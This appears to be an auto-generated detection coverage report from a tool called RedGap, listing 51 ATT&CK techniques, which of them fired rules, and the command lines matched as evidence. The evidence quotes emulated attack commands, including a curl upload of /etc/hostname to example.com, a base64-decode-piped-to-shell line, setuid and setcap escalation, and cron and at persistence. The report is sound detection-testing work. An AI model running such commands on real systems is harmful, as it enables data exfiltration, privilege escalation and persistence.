# RedGap coverage report

- Mode: **replay**
- Run: `replay`
- Generated: 2026-08-11T00:00:00+00:00

**33 / 51 techniques detected.**

| # | ATT&CK | Technique | Tactic | Detected | Gap | Firing rule |
|---|--------|-----------|--------|----------|-----|-------------|
| 1 | T1087.001 | Account Discovery: Local Account | Discovery | yes | - | b45e3d6f-42c6-47d8-a478-df6bd6cf534c |
| 2 | T1057 | Process Discovery | Discovery | no | base_rate | - |
| 3 | T1136.001 | Create Account: Local Account | Persistence | no | rule | - |
| 4 | T1548.001 | Abuse Elevation Control Mechanism: Setuid and Setgid | Privilege Escalation / Defense Evasion | yes | - | c21c4eaa-ba2e-419a-92b2-8371703cbe21 |
| 5 | T1070.006 | Indicator Removal: Timestomp | Defense Evasion | no | rule | - |
| 6 | T1082 | System Information Discovery | Discovery | yes | - | 42df45e7-e6e9-43b5-8f26-bec5b39cc239 |
| 7 | T1016 | System Network Configuration Discovery | Discovery | yes | - | e7bd1cfa-b446-4c88-8afb-403bcd79e3fa |
| 8 | T1069.001 | Permission Groups Discovery: Local Groups | Discovery | yes | - | 676381a6-15ca-4d73-a9c8-6a22e970b90d |
| 9 | T1518.001 | Software Discovery: Security Software Discovery | Discovery | yes | - | c9d8b7fd-78e4-44fe-88f6-599135d46d60 |
| 10 | T1083 | File and Directory Discovery | Discovery | yes | - | d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72 |
| 11 | T1033 | System Owner/User Discovery | Discovery | no | rule | - |
| 12 | T1518 | Software Discovery | Discovery | no | rule | - |
| 13 | T1140 | Deobfuscate/Decode Files or Information | Defense Evasion | yes | - | ba592c6d-6888-43c3-b8c6-689b8fe47337, 880973f3-9708-491c-a77b-2a35a1921158 |
| 14 | T1222.002 | Linux and Mac File and Directory Permissions Modification | Defense Evasion | yes | - | 34979410-e4b5-4e5d-8cfb-389fdff05c12 |
| 15 | T1070.004 | Indicator Removal: File Deletion | Defense Evasion | yes | - | 30aed7b6-d2c1-4eaf-9382-b6bc43e50c57 |
| 16 | T1497.001 | Virtualization/Sandbox Evasion: System Checks | Defense Evasion / Discovery | no | rule | - |
| 17 | T1059 | Command and Scripting Interpreter | Execution | yes | - | 8c1a5675-cb85-452f-a298-b01b22a51856 |
| 18 | T1059.004 | Command and Scripting Interpreter: Unix Shell | Execution | yes | - | bed978f8-7f3a-432b-82c5-9286a9b3031a |
| 19 | T1059.006 | Command and Scripting Interpreter: Python | Execution | no | rule | - |
| 20 | T1053.003 | Scheduled Task/Job: Cron | Execution / Persistence / Privilege Escalation | yes | - | 6b14bac8-3e3a-4324-8109-42f0546a347f |
| 21 | T1053.002 | Scheduled Task/Job: At | Privilege Escalation / Execution / Persistence | yes | - | d2d642d7-b393-43fe-bae4-e81ed5915c4b |
| 22 | T1548 | Abuse Elevation Control Mechanism | Privilege Escalation / Defense Evasion | yes | - | ed447910-bc30-4575-a598-3a2e49516a7a |
| 23 | T1546.004 | Event Triggered Execution: Unix Shell Configuration Modification | Persistence / Privilege Escalation | no | base_rate | - |
| 24 | T1098.004 | Account Manipulation: SSH Authorized Keys | Persistence / Privilege Escalation | no | rule | - |
| 25 | T1552.001 | Unsecured Credentials: Credentials In Files | Credential Access | yes | - | fa4aaed5-4fe0-498d-bbc0-08e3346387ba |
| 26 | T1003.008 | OS Credential Dumping: /etc/passwd and /etc/shadow | Credential Access | no | rule | - |
| 27 | T1552.004 | Unsecured Credentials: Private Keys | Credential Access | no | rule | - |
| 28 | T1560.001 | Archive Collected Data: Archive via Utility | Collection | no | rule | - |
| 29 | T1005 | Data from Local System | Collection | no | rule | - |
| 30 | T1071.001 | Application Layer Protocol: Web Protocols | Command and Control | yes | - | b86d356d-6093-443d-971c-9b07db583c68 |
| 31 | T1090 | Proxy | Command and Control | yes | - | 72f4ab3f-787d-495d-a55d-68c2ff46cf4c |
| 32 | T1567 | Exfiltration Over Web Service | Exfiltration | yes | - | 00b90cc1-17ec-402c-96ad-3a8117d7a582 |
| 33 | T1048.003 | Exfiltration Over Unencrypted Non-C2 Protocol | Exfiltration | yes | - | 3f0f5957-04f8-4792-ad89-192b0303bde6 |
| 34 | T1485 | Data Destruction | Impact | yes | - | 2953194b-e33c-4859-b9e8-05948c167447 |
| 35 | T1489 | Service Stop | Impact | yes | - | de25eeb8-3655-4643-ac3a-b662d3f26b6b |
| 36 | T1653 | Power Settings | Persistence | yes | - | c172b7b5-f3a1-4af2-90b7-822c63df86cb |
| 37 | T1565.001 | Data Manipulation: Stored Data Manipulation | Impact | yes | - | 86157017-c2b1-4d4a-8c33-93b8e67e4af4 |
| 38 | T1592.004 | Gather Victim Host Information: Client Configurations | Reconnaissance | yes | - | 0f79c4d2-4e1f-4683-9c36-b5469a665e06 |
| 39 | T1007 | System Service Discovery | Discovery | yes | - | 403ed92c-b7ec-4edd-9947-5b535ee12d46 |
| 40 | T1049 | System Network Connections Discovery | Discovery | yes | - | 4c519226-f0cd-4471-bd2f-6fbb2bb68a79 |
| 41 | T1027 | Obfuscated Files or Information | Defense Evasion | yes | - | e2072cab-8c9a-459b-b63c-40ae79e27031 |
| 42 | T1036 | Masquerading | Defense Evasion | yes | - | 312b42b1-bded-4441-8b58-163a3af58775 |
| 43 | T1055.009 | Process Injection: Proc Memory | Defense Evasion / Privilege Escalation | yes | - | 4cad6c64-d6df-42d6-8dae-eb78defdc415 |
| 44 | T1070 | Indicator Removal | Defense Evasion | yes | - | 95d61234-7f56-465c-6f2d-b562c6fedbc4 |
| 45 | T1105 | Ingress Tool Transfer | Command and Control | yes | - | ea34fb97-e2c4-4afb-810f-785e4459b194 |
| 46 | T1531 | Account Access Removal | Impact | yes | - | 8a46f16c-8c4c-82d1-b121-0fdd3ba70a84 |
| 47 | T1201 | Password Policy Discovery | Discovery | no | rule | - |
| 48 | T1614.001 | System Location Discovery: System Language Discovery | Discovery | no | rule | - |
| 49 | T1613 | Container and Resource Discovery | Discovery | no | rule | - |
| 50 | T1070.003 | Indicator Removal: Clear Command History | Defense Evasion | no | rule | - |
| 51 | T1543.002 | Create or Modify System Process: Systemd Service | Persistence / Privilege Escalation | no | rule | - |

## Gaps

A gap is a finding, not an error - each names why detection did not fire:

- **T1057 Process Discovery** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1136.001 Create Account: Local Account** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1070.006 Indicator Removal: Timestomp** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1033 System Owner/User Discovery** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1518 Software Discovery** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1497.001 Virtualization/Sandbox Evasion: System Checks** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1059.006 Command and Scripting Interpreter: Python** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1546.004 Event Triggered Execution: Unix Shell Configuration Modification** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1098.004 Account Manipulation: SSH Authorized Keys** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1003.008 OS Credential Dumping: /etc/passwd and /etc/shadow** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1552.004 Unsecured Credentials: Private Keys** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1560.001 Archive Collected Data: Archive via Utility** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1005 Data from Local System** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1201 Password Policy Discovery** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1614.001 System Location Discovery: System Language Discovery** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1613 Container and Resource Discovery** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1070.003 Indicator Removal: Clear Command History** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)
- **T1543.002 Create or Modify System Process: Systemd Service** - uncovered: telemetry present, but none of your rules fired (write a rule to close it)

## Evidence

Every detection is traceable to a rule and the exact event fields it matched:

- **T1087.001** - rule `b45e3d6f-42c6-47d8-a478-df6bd6cf534c` on event `ev_8cc32953659d6a0f`: `CommandLine`='cat /etc/passwd', `Image`='/usr/bin/cat'
- **T1548.001** - rule `c21c4eaa-ba2e-419a-92b2-8371703cbe21` on event `ev_d929238d23655c15`: `CommandLine`="sh -c sh -c 'chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid'"
- **T1548.001** - rule `c21c4eaa-ba2e-419a-92b2-8371703cbe21` on event `ev_9f4b0b9f94ab69fb`: `CommandLine`='sh -c chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid'
- **T1082** - rule `42df45e7-e6e9-43b5-8f26-bec5b39cc239` on event `ev_09a327f36add84c5`: `Image`='/usr/bin/uname'
- **T1016** - rule `e7bd1cfa-b446-4c88-8afb-403bcd79e3fa` on event `ev_faea63ac7be5f6ad`: `CommandLine`='sh -c cat /etc/resolv.conf'
- **T1016** - rule `e7bd1cfa-b446-4c88-8afb-403bcd79e3fa` on event `ev_fd762542db26e662`: `CommandLine`='cat /etc/resolv.conf'
- **T1069.001** - rule `676381a6-15ca-4d73-a9c8-6a22e970b90d` on event `ev_7f0b30355b0d8a61`: `Image`='/usr/bin/groups'
- **T1518.001** - rule `c9d8b7fd-78e4-44fe-88f6-599135d46d60` on event `ev_0bf317a70a6d11b5`: `CommandLine`='grep falcond /etc/passwd', `Image`='/usr/bin/grep'
- **T1083** - rule `d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72` on event `ev_64ab2d226f495351`: `Image`='/usr/bin/find'
- **T1140** - rule `ba592c6d-6888-43c3-b8c6-689b8fe47337` on event `ev_3ec00924b2152c74`: `CommandLine`='sh -c echo bHM= | base64 -d | sh'
- **T1140** - rule `880973f3-9708-491c-a77b-2a35a1921158` on event `ev_3ec00924b2152c74`: `CommandLine`='sh -c echo bHM= | base64 -d | sh'
- **T1222.002** - rule `34979410-e4b5-4e5d-8cfb-389fdff05c12` on event `ev_59c8a97cbc4bc1dc`: `CommandLine`='chattr -i /tmp/redgap_imm', `Image`='/usr/bin/chattr'
- **T1070.004** - rule `30aed7b6-d2c1-4eaf-9382-b6bc43e50c57` on event `ev_e46877f47f9d4251`: `Image`='/usr/bin/shred'
- **T1070.004** - rule `30aed7b6-d2c1-4eaf-9382-b6bc43e50c57` on event `ev_0571f71e77ce7aa9`: `Image`='/usr/bin/rm'
- **T1059** - rule `8c1a5675-cb85-452f-a298-b01b22a51856` on event `ev_c4f6ae100c72d98f`: `CommandLine`='awk BEGIN {system("/bin/sh -c id")}', `Image`='/usr/bin/mawk'
- **T1059.004** - rule `bed978f8-7f3a-432b-82c5-9286a9b3031a` on event `ev_3602781b2502231d`: `CommandLine`='env /bin/sh -c id', `Image`='/usr/bin/env'
- **T1053.003** - rule `6b14bac8-3e3a-4324-8109-42f0546a347f` on event `ev_83f32ec87b14a037`: `CommandLine`='crontab /tmp/rgcron', `Image`='/usr/bin/crontab'
- **T1053.002** - rule `d2d642d7-b393-43fe-bae4-e81ed5915c4b` on event `ev_650d17eedb8e45ea`: `Image`='/usr/bin/at'
- **T1053.002** - rule `d2d642d7-b393-43fe-bae4-e81ed5915c4b` on event `ev_c8ca9873a92a3388`: `Image`='/usr/bin/at'
- **T1053.002** - rule `d2d642d7-b393-43fe-bae4-e81ed5915c4b` on event `ev_91f4866e640fdd6e`: `Image`='/usr/bin/at'
- **T1548** - rule `ed447910-bc30-4575-a598-3a2e49516a7a` on event `ev_6e20f5e93589a171`: `CommandLine`='setcap cap_setuid+ep /tmp/rgcap', `Image`='/usr/sbin/setcap'
- **T1552.001** - rule `fa4aaed5-4fe0-498d-bbc0-08e3346387ba` on event `ev_76d0bc088ca8cbee`: `CommandLine`='cp /tmp/shadow /tmp/shadow.bak', `Image`='/usr/bin/cp'
- **T1071.001** - rule `b86d356d-6093-443d-971c-9b07db583c68` on event `ev_6508ada44da815fb`: `CommandLine`='curl -A RedGap/1.0 http://example.com/', `Image`='/usr/bin/curl'
- **T1090** - rule `72f4ab3f-787d-495d-a55d-68c2ff46cf4c` on event `ev_8b3b5064bb7ff2e0`: `CommandLine`='sh -c env http_proxy=http://127.0.0.1:3128 true'
- **T1090** - rule `72f4ab3f-787d-495d-a55d-68c2ff46cf4c` on event `ev_c54771db2bd49569`: `CommandLine`='env http_proxy=http://127.0.0.1:3128 true'
- **T1567** - rule `00b90cc1-17ec-402c-96ad-3a8117d7a582` on event `ev_4516f3d652c3985b`: `CommandLine`='curl --upload-file /etc/hostname http://example.com/', `Image`='/usr/bin/curl'
- **T1048.003** - rule `3f0f5957-04f8-4792-ad89-192b0303bde6` on event `ev_6b5c579b5f996180`: `CommandLine`='python3 -m http.server 8000', `Image`='/usr/bin/python3.13'
- **T1485** - rule `2953194b-e33c-4859-b9e8-05948c167447` on event `ev_61d0f169d59b6a2b`: `CommandLine`='dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1', `Image`='/usr/bin/dd'
- **T1489** - rule `de25eeb8-3655-4643-ac3a-b662d3f26b6b` on event `ev_b4140bc0d6b04804`: `CommandLine`='systemctl stop redgap-nonexistent.service', `Image`='/usr/bin/systemctl'
- **T1653** - rule `c172b7b5-f3a1-4af2-90b7-822c63df86cb` on event `ev_34cf682ff64c2727`: `CommandLine`='systemctl mask hibernate.target', `Image`='/usr/bin/systemctl'
- **T1565.001** - rule `86157017-c2b1-4d4a-8c33-93b8e67e4af4` on event `ev_4a549658cf1f85a5`: `CommandLine`='sed -n 1p /etc/hosts', `Image`='/usr/bin/sed'
- **T1592.004** - rule `0f79c4d2-4e1f-4683-9c36-b5469a665e06` on event `ev_788965f1b58e698f`: `CommandLine`='grep root /etc/sudoers', `Image`='/usr/bin/grep'
- **T1007** - rule `403ed92c-b7ec-4edd-9947-5b535ee12d46` on event `ev_e3572ae3a944e1d4`: `CommandLine`='crontab -l', `Image`='/usr/bin/crontab'
- **T1049** - rule `4c519226-f0cd-4471-bd2f-6fbb2bb68a79` on event `ev_4bd196d0c1db405c`: `Image`='/usr/bin/who'
- **T1027** - rule `e2072cab-8c9a-459b-b63c-40ae79e27031` on event `ev_185ed086e04b4ef4`: `CommandLine`='base64 -d', `Image`='/usr/bin/base64'
- **T1036** - rule `312b42b1-bded-4441-8b58-163a3af58775` on event `ev_690dd76262e88d35`: `Image`='/tmp/rgmasq'
- **T1055.009** - rule `4cad6c64-d6df-42d6-8dae-eb78defdc415` on event `ev_929ff87795a996f9`: `CommandLine`='dd if=/dev/null of=/proc/self/mem', `Image`='/usr/bin/dd'
- **T1070** - rule `95d61234-7f56-465c-6f2d-b562c6fedbc4` on event `ev_a806b2d702c02092`: `CommandLine`='dpkg --remove redgap-nonexistent', `Image`='/usr/bin/dpkg'
- **T1105** - rule `ea34fb97-e2c4-4afb-810f-785e4459b194` on event `ev_eb154e42a391cb6a`: `Image`='/usr/bin/curl'
- **T1531** - rule `8a46f16c-8c4c-82d1-b121-0fdd3ba70a84` on event `ev_d245f9c21249b42a`: `Image`='/usr/sbin/groupdel'
- **T1531** - rule `8a46f16c-8c4c-82d1-b121-0fdd3ba70a84` on event `ev_6877fd5bcdae8a16`: `Image`='/usr/sbin/groupdel'
